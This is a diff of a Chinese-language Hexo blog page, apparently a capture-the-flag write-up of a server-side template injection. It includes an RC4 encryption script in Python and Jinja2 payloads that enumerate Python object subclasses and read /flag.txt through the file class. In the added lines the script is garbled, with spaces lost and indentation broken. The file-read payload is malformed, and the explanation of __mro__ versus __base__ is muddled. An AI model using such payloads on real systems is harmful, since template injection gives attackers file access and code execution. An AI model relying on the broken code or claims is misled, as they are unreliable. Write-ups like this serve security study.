@@ -6,17 +6,17 @@
   
   <title>记录一次简单的ssti | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="这是一个简单的ssti漏洞，首先我们找到了这个路由，并看到了模板渲染这么一个函数，以及一个rc4加密。然后直接使用脚本，把RC4算法给弄出来。以下是脚本:  &#x2F;&#x2F;* import base64  from urllib.parse import quote  defrc4_main(key&#x3D;&quot;init_key&quot;, message&#x3D;&quot;init_message&quot;):      # print(&quot;RC">
+  <meta name="description" content="这是一个简单的ssti漏洞，首先我们找到了这个路由，并看到了模板渲染这么一个函数，以及一个rc4加密。然后直接使用脚本，把RC4算法给弄出来。以下是脚本: 1python  &#x2F;&#x2F;*import base64 from urllib.parse import quote defrc4_main(key&#x3D;”init_key”, message&#x3D;”init_me">
 <meta property="og:type" content="article">
 <meta property="og:title" content="记录一次简单的ssti">
 <meta property="og:url" content="http://example.com/2025/09/19/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84ssti/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="这是一个简单的ssti漏洞，首先我们找到了这个路由，并看到了模板渲染这么一个函数，以及一个rc4加密。然后直接使用脚本，把RC4算法给弄出来。以下是脚本:  &#x2F;&#x2F;* import base64  from urllib.parse import quote  defrc4_main(key&#x3D;&quot;init_key&quot;, message&#x3D;&quot;init_message&quot;):      # print(&quot;RC">
+<meta property="og:description" content="这是一个简单的ssti漏洞，首先我们找到了这个路由，并看到了模板渲染这么一个函数，以及一个rc4加密。然后直接使用脚本，把RC4算法给弄出来。以下是脚本: 1python  &#x2F;&#x2F;*import base64 from urllib.parse import quote defrc4_main(key&#x3D;”init_key”, message&#x3D;”init_me">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2025/09/19/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84ssti/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84ssti/1758278367839.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hack-xx/hu/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-19%20190752.png">
 <meta property="article:published_time" content="2025-09-19T09:26:46.000Z">
-<meta property="article:modified_time" content="2025-09-19T11:38:04.834Z">
+<meta property="article:modified_time" content="2025-09-19T11:46:04.115Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2025/09/19/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84ssti/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84ssti/1758278367839.png">
@@ -100,79 +100,75 @@
       
         <p><img src="/2025/09/19/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84ssti/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84ssti/1758278367839.png" alt="1"></p>
 <p>这是一个简单的ssti漏洞，首先我们找到了这个路由，并看到了模板渲染这么一个函数，以及一个rc4加密。然后直接使用脚本，把RC4算法给弄出来。以下是脚本:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python</span><br></pre></td></tr></table></figure>
 
-//*
-import base64
+<p>&#x2F;&#x2F;*<br>import base64</p>
+<p>from urllib.parse import quote</p>
+<p>defrc4_main(key&#x3D;”init_key”, message&#x3D;”init_message”):</p>
+<pre><code># print(&quot;RC4加密主函数&quot;)
 
-from urllib.parse import quote
+s_box=rc4_init_sbox(key)
 
-defrc4_main(key="init_key", message="init_message"):
+crypt=str(rc4_excrypt(message, s_box))
 
-    # print("RC4加密主函数")
+return crypt
+</code></pre>
+<p>defrc4_init_sbox(key):</p>
+<pre><code>s_box=list(range(256))
 
-    s_box=rc4_init_sbox(key)
+# print(&quot;原来的 s 盒：%s&quot; % s_box)
 
-    crypt=str(rc4_excrypt(message, s_box))
+j=0
 
-    return crypt
+foriinrange(256):
 
-defrc4_init_sbox(key):
+j= (j+s_box[i] +ord(key[i%len(key)])) %256
 
-    s_box=list(range(256))
+s_box[i], s_box[j] =s_box[j], s_box[i]
 
-    # print("原来的 s 盒：%s" % s_box)
+# print(&quot;混乱后的 s 盒：%s&quot;% s_box)
 
-    j=0
+return s_box
+</code></pre>
+<p>defrc4_excrypt(plain, box):</p>
+<pre><code># print(&quot;调用加密程序成功。&quot;)
 
-    foriinrange(256):
+res= []
 
-    j= (j+s_box[i] +ord(key[i%len(key)])) %256
+i=j=0
 
-    s_box[i], s_box[j] =s_box[j], s_box[i]
+for s in plain:
 
-    # print("混乱后的 s 盒：%s"% s_box)
+i= (i+1) %256
 
-    return s_box
+j= (j+box[i]) %256
 
-defrc4_excrypt(plain, box):
+box[i], box[j] =box[j], box[i]
 
-    # print("调用加密程序成功。")
+t= (box[i] +box[j]) %256
 
-    res= []
+k=box[t]
 
-    i=j=0
+res.append(chr(ord(s) ^k))
 
-    for s in plain:
+# print(&quot;res用于加密字符串，加密后是：%res&quot; %res)
 
-    i= (i+1) %256
+cipher=&quot;&quot;.join(res)
 
-    j= (j+box[i]) %256
+print(&quot;加密后的字符串是：%s&quot;%quote(cipher))
 
-    box[i], box[j] =box[j], box[i]
+# print(&quot;加密后的输出(经过编码):&quot;)
 
-    t= (box[i] +box[j]) %256
+# print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))
 
-    k=box[t]
+returnstr(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;)
+</code></pre>
+<p>rc4_main(“key”, “text”)     #这里的key为HereIsTreasure   text为要写入的内容<br>*&#x2F;&#x2F;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
 
-    res.append(chr(ord(s) ^k))
-
-    # print("res用于加密字符串，加密后是：%res" %res)
-
-    cipher="".join(res)
-
-    print("加密后的字符串是：%s"%quote(cipher))
-
-    # print("加密后的输出(经过编码):")
-
-    # print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
-
-    returnstr(base64.b64encode(cipher.encode('utf-8')), 'utf-8')
-
-rc4_main("key", "text")     #这里的key为HereIsTreasure   text为要写入的内容
-*//
-
-
-<p>这里直接构造payload:{{''.__class__.__mro__[2].__subclasses__()}}<br><img src="https://raw.githubusercontent.com/hack-xx/hu/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-19%20190752.png" alt="2"></p>
+<p>这里直接构造payload:{{''.__class__.__mro__[2].__subclasses__()}}  这里用mro不用base的原因是，base在python3适用，Python2适用于mro</p>
+<p><img src="https://raw.githubusercontent.com/hack-xx/hu/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-19%20190752.png" alt="2"></p>
+<p>发现这里有一个file可以利用，直接{{''.__class__.__mro__[2].__subclasses()[40].read('/flag.txt).read())__}}</p>
 <span id="more"></span>
 
       
